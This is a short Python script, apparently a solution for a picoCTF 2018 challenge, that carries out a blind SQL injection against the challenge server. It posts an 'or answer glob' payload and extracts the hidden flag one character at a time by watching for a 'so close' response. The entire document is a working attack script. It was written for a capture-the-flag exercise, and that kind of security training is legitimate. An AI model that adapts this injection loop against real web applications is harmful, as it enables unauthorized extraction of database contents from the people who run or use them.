import requests
import string

url = "http://2018shell2.picoctf.com:28120/answer2.php"

payload = "answer=%27+or+answer+glob+%27{}*"
headers = {
    'origin': "http://2018shell2.picoctf.com:28120",
    'content-type': "application/x-www-form-urlencoded",
    }

flag_so_far = ""
cands = string.ascii_letters + string.digits

while True:
    for cand in cands:
        response = requests.request("POST", url, data=payload.format(flag_so_far+cand), headers=headers)

        if 'so close' in response.text:
            flag_so_far += cand
            print 'found flag_so_far', flag_so_far